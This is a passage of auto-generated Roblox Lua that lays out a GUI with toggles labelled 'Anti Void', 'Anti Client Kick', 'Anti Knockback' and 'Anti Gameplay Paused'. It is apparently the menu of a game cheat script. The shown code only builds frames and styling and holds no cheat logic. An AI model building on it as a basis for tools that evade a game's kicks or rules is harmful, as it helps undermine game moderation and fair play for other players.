G2L["160"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["160"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["160"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["160"]["ZIndex"] = 50;
G2L["160"]["BackgroundTransparency"] = 1;
G2L["160"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["160"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["160"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.UIPadding
G2L["161"] = Instance.new("UIPadding", G2L["160"]);
G2L["161"]["PaddingTop"] = UDim.new(0, 3);
G2L["161"]["PaddingRight"] = UDim.new(0, 3);
G2L["161"]["PaddingLeft"] = UDim.new(0, 3);
G2L["161"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.toggleFrame
G2L["162"] = Instance.new("Frame", G2L["160"]);
G2L["162"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["162"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["162"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["162"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["162"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.toggleFrame.outlineStroke
G2L["163"] = Instance.new("UIStroke", G2L["162"]);
G2L["163"]["Thickness"] = 2;
G2L["163"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.toggleFrame.toggleFade
G2L["164"] = Instance.new("CanvasGroup", G2L["162"]);
G2L["164"]["BorderSizePixel"] = 0;
G2L["164"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["164"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["164"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["164"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["164"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.toggleFrame.toggleFade.UIGradient
G2L["165"] = Instance.new("UIGradient", G2L["164"]);
G2L["165"]["Rotation"] = 90;
G2L["165"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.text
G2L["166"] = Instance.new("TextLabel", G2L["15f"]);
G2L["166"]["TextWrapped"] = true;
G2L["166"]["ZIndex"] = 10;
G2L["166"]["BorderSizePixel"] = 0;
G2L["166"]["TextSize"] = 14;
G2L["166"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["166"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["166"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["166"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["166"]["BackgroundTransparency"] = 1;
G2L["166"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["166"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["166"]["Text"] = [[Anti Void]];
G2L["166"]["Name"] = [[text]];
G2L["166"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.text.UIPadding
G2L["167"] = Instance.new("UIPadding", G2L["166"]);
G2L["167"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.text.text
G2L["168"] = Instance.new("UIStroke", G2L["166"]);
G2L["168"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.UIPadding
G2L["169"] = Instance.new("UIPadding", G2L["15f"]);
G2L["169"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused
G2L["16a"] = Instance.new("Frame", G2L["137"]);
G2L["16a"]["BorderSizePixel"] = 0;
G2L["16a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16a"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["16a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["16a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16a"]["Name"] = [[gameplaypaused]];
G2L["16a"]["LayoutOrder"] = 2;
G2L["16a"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button
G2L["16b"] = Instance.new("TextButton", G2L["16a"]);
G2L["16b"]["BorderSizePixel"] = 0;
G2L["16b"]["TextTransparency"] = 1;
G2L["16b"]["TextSize"] = 14;
G2L["16b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16b"]["ZIndex"] = 50;
G2L["16b"]["BackgroundTransparency"] = 1;
G2L["16b"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["16b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16b"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.UIPadding
G2L["16c"] = Instance.new("UIPadding", G2L["16b"]);
G2L["16c"]["PaddingTop"] = UDim.new(0, 3);
G2L["16c"]["PaddingRight"] = UDim.new(0, 3);
G2L["16c"]["PaddingLeft"] = UDim.new(0, 3);
G2L["16c"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame
G2L["16d"] = Instance.new("Frame", G2L["16b"]);
G2L["16d"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["16d"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["16d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["16d"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["16d"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame.outlineStroke
G2L["16e"] = Instance.new("UIStroke", G2L["16d"]);
G2L["16e"]["Thickness"] = 2;
G2L["16e"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame.toggleFade
G2L["16f"] = Instance.new("CanvasGroup", G2L["16d"]);
G2L["16f"]["BorderSizePixel"] = 0;
G2L["16f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16f"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["16f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16f"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame.toggleFade.UIGradient
G2L["170"] = Instance.new("UIGradient", G2L["16f"]);
G2L["170"]["Rotation"] = 90;
G2L["170"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.text
G2L["171"] = Instance.new("TextLabel", G2L["16a"]);
G2L["171"]["TextWrapped"] = true;
G2L["171"]["ZIndex"] = 10;
G2L["171"]["BorderSizePixel"] = 0;
G2L["171"]["TextSize"] = 14;
G2L["171"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["171"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["171"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["171"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["171"]["BackgroundTransparency"] = 1;
G2L["171"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["171"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["171"]["Text"] = [[Anti Gameplay Paused]];
G2L["171"]["Name"] = [[text]];
G2L["171"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.text.UIPadding
G2L["172"] = Instance.new("UIPadding", G2L["171"]);
G2L["172"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.text.text
G2L["173"] = Instance.new("UIStroke", G2L["171"]);
G2L["173"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.UIPadding
G2L["174"] = Instance.new("UIPadding", G2L["16a"]);
G2L["174"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---
G2L["175"] = Instance.new("Frame", G2L["137"]);
G2L["175"]["BorderSizePixel"] = 0;
G2L["175"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["175"]["Size"] = UDim2.new(1, 0, 0, 10);
G2L["175"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["175"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["175"]["Name"] = [[---DIVIDER---]];
G2L["175"]["LayoutOrder"] = 3;
G2L["175"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame
G2L["176"] = Instance.new("Frame", G2L["175"]);
G2L["176"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["176"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["176"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["176"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["176"]["Name"] = [[dividerFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.outlineStroke
G2L["177"] = Instance.new("UIStroke", G2L["176"]);
G2L["177"]["Thickness"] = 2;
G2L["177"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade
G2L["178"] = Instance.new("CanvasGroup", G2L["176"]);
G2L["178"]["BorderSizePixel"] = 0;
G2L["178"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["178"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["178"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["178"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["178"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
G2L["179"] = Instance.new("UIGradient", G2L["178"]);
G2L["179"]["Rotation"] = 90;
G2L["179"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.UIStroke
G2L["17a"] = Instance.new("UIStroke", G2L["176"]);
G2L["17a"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["17a"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.UICorner
G2L["17b"] = Instance.new("UICorner", G2L["176"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.UIPadding
G2L["17c"] = Instance.new("UIPadding", G2L["175"]);
G2L["17c"]["PaddingTop"] = UDim.new(0, 3);
G2L["17c"]["PaddingRight"] = UDim.new(0, 8);
G2L["17c"]["PaddingLeft"] = UDim.new(0, 8);
G2L["17c"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick
G2L["17d"] = Instance.new("Frame", G2L["137"]);
G2L["17d"]["BorderSizePixel"] = 0;
G2L["17d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17d"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["17d"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["17d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17d"]["Name"] = [[kick]];
G2L["17d"]["LayoutOrder"] = 2;
G2L["17d"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button
G2L["17e"] = Instance.new("TextButton", G2L["17d"]);
G2L["17e"]["BorderSizePixel"] = 0;
G2L["17e"]["TextTransparency"] = 1;
G2L["17e"]["TextSize"] = 14;
G2L["17e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17e"]["ZIndex"] = 50;
G2L["17e"]["BackgroundTransparency"] = 1;
G2L["17e"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["17e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17e"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.UIPadding
G2L["17f"] = Instance.new("UIPadding", G2L["17e"]);
G2L["17f"]["PaddingTop"] = UDim.new(0, 3);
G2L["17f"]["PaddingRight"] = UDim.new(0, 3);
G2L["17f"]["PaddingLeft"] = UDim.new(0, 3);
G2L["17f"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame
G2L["180"] = Instance.new("Frame", G2L["17e"]);
G2L["180"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["180"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["180"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["180"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["180"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame.outlineStroke
G2L["181"] = Instance.new("UIStroke", G2L["180"]);
G2L["181"]["Thickness"] = 2;
G2L["181"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame.toggleFade
G2L["182"] = Instance.new("CanvasGroup", G2L["180"]);
G2L["182"]["BorderSizePixel"] = 0;
G2L["182"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["182"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["182"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["182"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["182"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame.toggleFade.UIGradient
G2L["183"] = Instance.new("UIGradient", G2L["182"]);
G2L["183"]["Rotation"] = 90;
G2L["183"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.text
G2L["184"] = Instance.new("TextLabel", G2L["17d"]);
G2L["184"]["TextWrapped"] = true;
G2L["184"]["ZIndex"] = 10;
G2L["184"]["BorderSizePixel"] = 0;
G2L["184"]["TextSize"] = 14;
G2L["184"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["184"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["184"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["184"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["184"]["BackgroundTransparency"] = 1;
G2L["184"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["184"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["184"]["Text"] = [[Anti Client Kick]];
G2L["184"]["Name"] = [[text]];
G2L["184"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.text.UIPadding
G2L["185"] = Instance.new("UIPadding", G2L["184"]);
G2L["185"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.text.text
G2L["186"] = Instance.new("UIStroke", G2L["184"]);
G2L["186"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.UIPadding
G2L["187"] = Instance.new("UIPadding", G2L["17d"]);
G2L["187"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback
G2L["188"] = Instance.new("Frame", G2L["137"]);
G2L["188"]["BorderSizePixel"] = 0;
G2L["188"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["188"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["188"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["188"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["188"]["Name"] = [[knockback]];
G2L["188"]["LayoutOrder"] = 4;
G2L["188"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button
G2L["189"] = Instance.new("TextButton", G2L["188"]);
G2L["189"]["BorderSizePixel"] = 0;
G2L["189"]["TextTransparency"] = 1;
G2L["189"]["TextSize"] = 14;
G2L["189"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["189"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["189"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["189"]["ZIndex"] = 50;
G2L["189"]["BackgroundTransparency"] = 1;
G2L["189"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["189"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["189"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.UIPadding
G2L["18a"] = Instance.new("UIPadding", G2L["189"]);
G2L["18a"]["PaddingTop"] = UDim.new(0, 3);
G2L["18a"]["PaddingRight"] = UDim.new(0, 3);
G2L["18a"]["PaddingLeft"] = UDim.new(0, 3);
G2L["18a"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame
G2L["18b"] = Instance.new("Frame", G2L["189"]);
G2L["18b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["18b"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["18b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["18b"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["18b"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame.outlineStroke
G2L["18c"] = Instance.new("UIStroke", G2L["18b"]);
G2L["18c"]["Thickness"] = 2;
G2L["18c"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame.toggleFade
G2L["18d"] = Instance.new("CanvasGroup", G2L["18b"]);
G2L["18d"]["BorderSizePixel"] = 0;
G2L["18d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["18d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18d"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame.toggleFade.UIGradient
G2L["18e"] = Instance.new("UIGradient", G2L["18d"]);
G2L["18e"]["Rotation"] = 90;
G2L["18e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.text
G2L["18f"] = Instance.new("TextLabel", G2L["188"]);
G2L["18f"]["TextWrapped"] = true;
G2L["18f"]["ZIndex"] = 10;
G2L["18f"]["BorderSizePixel"] = 0;
G2L["18f"]["TextSize"] = 14;
G2L["18f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["18f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18f"]["BackgroundTransparency"] = 1;
G2L["18f"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["18f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18f"]["Text"] = [[Anti Knockback]];
G2L["18f"]["Name"] = [[text]];
G2L["18f"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.text.UIPadding
G2L["190"] = Instance.new("UIPadding", G2L["18f"]);
G2L["190"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.text.text
G2L["191"] = Instance.new("UIStroke", G2L["18f"]);
G2L["191"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.UIPadding
G2L["192"] = Instance.new("UIPadding", G2L["188"]);
G2L["192"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======
G2L["193"] = Instance.new("Frame", G2L["137"]);
G2L["193"]["BorderSizePixel"] = 0;
G2L["193"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["193"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["193"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["193"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["193"]["Name"] = [[======TITLE======]];
G2L["193"]["LayoutOrder"] = 1;
G2L["193"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======.text
G2L["194"] = Instance.new("TextLabel", G2L["193"]);
G2L["194"]["TextWrapped"] = true;
G2L["194"]["BorderSizePixel"] = 0;
G2L["194"]["TextSize"] = 14;
G2L["194"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["194"]["TextTransparency"] = 0.3;
G2L["194"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["194"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["194"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["194"]["BackgroundTransparency"] = 1;
G2L["194"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["194"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["194"]["Text"] = [[Anti]];
G2L["194"]["Name"] = [[text]];
G2L["194"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======.text.text
G2L["195"] = Instance.new("UIStroke", G2L["194"]);
G2L["195"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======.text.UIPadding
G2L["196"] = Instance.new("UIPadding", G2L["194"]);
G2L["196"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside
G2L["197"] = Instance.new("Frame", G2L["134"]);
G2L["197"]["BorderSizePixel"] = 0;
G2L["197"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["197"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["197"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
G2L["197"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["197"]["Name"] = [[leftside]];
G2L["197"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.UIListLayout
G2L["198"] = Instance.new("UIListLayout", G2L["197"]);
G2L["198"]["Padding"] = UDim.new(0, 5);
G2L["198"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab
G2L["199"] = Instance.new("Frame", G2L["197"]);
G2L["199"]["BorderSizePixel"] = 0;
G2L["199"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["199"]["Size"] = UDim2.new(0, 176, 0, 160);
G2L["199"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["199"]["Name"] = [[characterTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.characterScript
G2L["19a"] = Instance.new("LocalScript", G2L["199"]);
G2L["19a"]["Name"] = [[characterScript]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.UIListLayout
G2L["19b"] = Instance.new("UIListLayout", G2L["199"]);
G2L["19b"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["19b"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.greystroke
G2L["19c"] = Instance.new("UIStroke", G2L["199"]);
G2L["19c"]["ZIndex"] = 99;
G2L["19c"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["19c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["19c"]["Name"] = [[greystroke]];
G2L["19c"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======ACCENT======
G2L["19d"] = Instance.new("Frame", G2L["199"]);
G2L["19d"]["BorderSizePixel"] = 0;
G2L["19d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19d"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["19d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19d"]["Name"] = [[======ACCENT======]];
G2L["19d"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======ACCENT======.GuiColor
G2L["19e"] = Instance.new("Frame", G2L["19d"]);
G2L["19e"]["BorderSizePixel"] = 0;
G2L["19e"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["19e"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["19e"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["19e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19e"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======ACCENT======.GuiColor.UICorner
